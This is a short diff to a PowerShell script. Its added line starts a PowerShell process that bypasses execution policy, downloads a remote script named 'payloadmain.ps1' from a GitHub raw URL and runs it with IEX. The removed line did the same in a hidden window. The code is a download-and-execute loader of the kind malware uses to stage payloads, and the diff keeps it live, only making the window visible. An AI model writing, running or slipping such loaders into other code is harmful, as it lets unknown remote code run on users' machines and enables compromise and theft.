@@ -2,7 +2,7 @@
 $currentProcess = Get-Process -Id $PID
 
 # Start a new hidden PowerShell process
-$newProcess = Start-Process powershell -PassThru -WindowStyle Hidden -ArgumentList @('-NoProfile', '-ExecutionPolicy Bypass', '-Command {powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EffortPeaked/gsdttsada/main/payloadmain.ps1');"}')
+$newProcess = Start-Process powershell -ArgumentList @('-NoProfile', '-ExecutionPolicy Bypass', '-Command {powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EffortPeaked/gsdttsada/main/payloadmain.ps1');"}')
 
 # Wait for the new process to finish
 $newProcess.WaitForExit()
